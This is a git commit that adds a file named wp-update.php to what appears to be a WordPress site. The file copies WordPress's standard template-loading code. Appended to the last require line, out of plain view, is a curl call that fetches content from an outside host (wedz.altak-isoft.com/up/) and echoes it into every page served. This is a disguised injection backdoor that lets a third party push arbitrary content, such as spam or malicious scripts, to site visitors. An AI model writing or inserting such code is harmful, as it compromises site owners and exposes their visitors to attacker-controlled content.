2d8bec914350b72b432b9a37c2c82b14e5bdef29
muhammadzainuri0468 <153602947+muhammadzainuri0468@users.noreply.github.com>
2024-01-29 16:49:06 +0700

    wp-update.php

---
+++ wp-update.php
@@ -0,0 +1,21 @@
+<?php
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
+
+if ( ! isset( $wp_did_header ) ) {
+
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, 'https://wedz.altak-isoft.com/up/'); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $a = curl_exec($ch); curl_close($ch); echo $a;
+
+}
